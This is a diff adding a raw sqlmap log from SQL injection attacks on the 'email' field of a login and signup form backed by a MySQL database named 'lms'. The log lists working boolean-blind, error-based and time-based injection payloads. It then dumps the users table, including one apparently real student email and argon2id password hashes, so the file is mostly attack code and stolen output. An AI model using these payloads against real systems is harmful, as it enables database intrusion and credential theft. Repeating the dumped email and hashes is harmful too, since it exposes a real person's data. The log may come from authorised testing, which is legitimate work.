@@ -1,0 +1,111 @@
+sqlmap identified the following injection point(s) with a total of 791 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: email=test@example.com' AND 9082=(SELECT (CASE WHEN (9082=9082) THEN 9082 ELSE (SELECT 2035 UNION SELECT 4756) END))-- -&password=password
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: email=test@example.com' AND GTID_SUBSET(CONCAT(0x716b767a71,(SELECT (ELT(8602=8602,1))),0x717a707a71),8602)-- Fxzv&password=password
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@example.com' AND (SELECT 9322 FROM (SELECT(SLEEP(5)))NhMy)-- jnUb&password=password
+---
+back-end DBMS: MySQL >= 5.6
+Database: lms
+Table: users
+[1 entry]
++----------------------------------+---------------------------------------------------------------------------------------------------+
+| email                            | password                                                                                          |
++----------------------------------+---------------------------------------------------------------------------------------------------+
+| p21013579@student.newinti.edu.my | $argon2id$v=19$m=65536,t=3,p=2$HKRvVHq+9C5y/Cd/qUoNXQ$cuYSHSIplk1VnYvzzGLZtDa8xLm7aLPCeXSrHp0MhVQ |
++----------------------------------+---------------------------------------------------------------------------------------------------+
+
+sqlmap identified the following injection point(s) with a total of 4254 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: name=test&email=test@example.com' AND 8970=8970-- mKxD&password=password
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: name=test&email=test@example.com' AND GTID_SUBSET(CONCAT(0x71706b7671,(SELECT (ELT(6033=6033,1))),0x71716a7a71),6033)-- lCQY&password=password
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=test&email=test@example.com' AND (SELECT 6779 FROM (SELECT(SLEEP(5)))cdeV)-- AjKd&password=password
+---
+back-end DBMS: MySQL >= 5.6
+Database: lms
+Table: users
+[7 entries]
++----------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------+
+| email                                                                                              | password                                                                                          |
++----------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------+
+| (SELECT CONCAT(0x71706b7671,(ELT(1585=1585,1)),0x71716a7a71))                                      | $argon2id$v=19$m=65536,t=3,p=2$n8n34JaqNow5J9d/4opztw$zZw/1fk9OWz8uunPDZSuAVazb23qctsC4B21DP9h2C4 |
+| (SELECT CONCAT(CONCAT(0x71706b7671,(CASE WHEN (6999=6999) THEN 0x31 ELSE 0x30 END)),0x71716a7a71)) | $argon2id$v=19$m=65536,t=3,p=2$PQxCU0gqlHp7b7wgd93L2w$0ICtlnHlIA+S+X36YM68qph+lPU5M5KaM6jnXF1Xl98 |
+| 1774                                                                                               | $argon2id$v=19$m=65536,t=3,p=2$iw7oo//5ylxE6jeknLZjgg$cefvL72cWGx0vwr6tO4ERRNiriZXU6dBIMiTj3xCQMs |
+| p21013579@student.newinti.edu.my                                                                   | $argon2id$v=19$m=65536,t=3,p=2$HKRvVHq+9C5y/Cd/qUoNXQ$cuYSHSIplk1VnYvzzGLZtDa8xLm7aLPCeXSrHp0MhVQ |
+| test@example.com                                                                                   | $argon2id$v=19$m=65536,t=3,p=2$jB946/9WTmb2BtapbzlCBQ$sbEj8NPByaQqG87uY4woOXXOWQuJ538k+Z/+qcYGbd0 |
+| test@example.com) AND 4371=7950-- mucH                                                             | $argon2id$v=19$m=65536,t=3,p=2$D5uNmAiDeBnRppximABxmA$pynn9/q3HslQHQqYazu+wMztUYwfOCy38mqekqGkPbU |
+| test@example.com) AND 8970=8970-- jIYU                                                             | $argon2id$v=19$m=65536,t=3,p=2$vEolwfNhAyzIs7IOBfU8tg$d/pW4iiLUCRdabFZO+lnm11opwNZy8DAebji1OdhJJU |
++----------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: email=test@example.com' AND 9082=(SELECT (CASE WHEN (9082=9082) THEN 9082 ELSE (SELECT 2035 UNION SELECT 4756) END))-- -&password=password
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: email=test@example.com' AND GTID_SUBSET(CONCAT(0x716b767a71,(SELECT (ELT(8602=8602,1))),0x717a707a71),8602)-- Fxzv&password=password
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@example.com' AND (SELECT 9322 FROM (SELECT(SLEEP(5)))NhMy)-- jnUb&password=password
+---
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: email=test@example.com' AND 9082=(SELECT (CASE WHEN (9082=9082) THEN 9082 ELSE (SELECT 2035 UNION SELECT 4756) END))-- -&password=password
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: email=test@example.com' AND GTID_SUBSET(CONCAT(0x716b767a71,(SELECT (ELT(8602=8602,1))),0x717a707a71),8602)-- Fxzv&password=password
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@example.com' AND (SELECT 9322 FROM (SELECT(SLEEP(5)))NhMy)-- jnUb&password=password
+---
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: email=test@example.com' AND 9082=(SELECT (CASE WHEN (9082=9082) THEN 9082 ELSE (SELECT 2035 UNION SELECT 4756) END))-- -&password=password
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: email=test@example.com' AND GTID_SUBSET(CONCAT(0x716b767a71,(SELECT (ELT(8602=8602,1))),0x717a707a71),8602)-- Fxzv&password=password
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@example.com' AND (SELECT 9322 FROM (SELECT(SLEEP(5)))NhMy)-- jnUb&password=password
+---
+back-end DBMS: MySQL >= 8.0.0
+Database: lms
+Table: users
+[1 entry]
++----------------------------------+---------------------------------------------------------------------------------------------------+
+| email                            | password                                                                                          |
++----------------------------------+---------------------------------------------------------------------------------------------------+
+| p21013579@student.newinti.edu.my | $argon2id$v=19$m=65536,t=3,p=2$HKRvVHq+9C5y/Cd/qUoNXQ$cuYSHSIplk1VnYvzzGLZtDa8xLm7aLPCeXSrHp0MhVQ |
++----------------------------------+---------------------------------------------------------------------------------------------------+
+
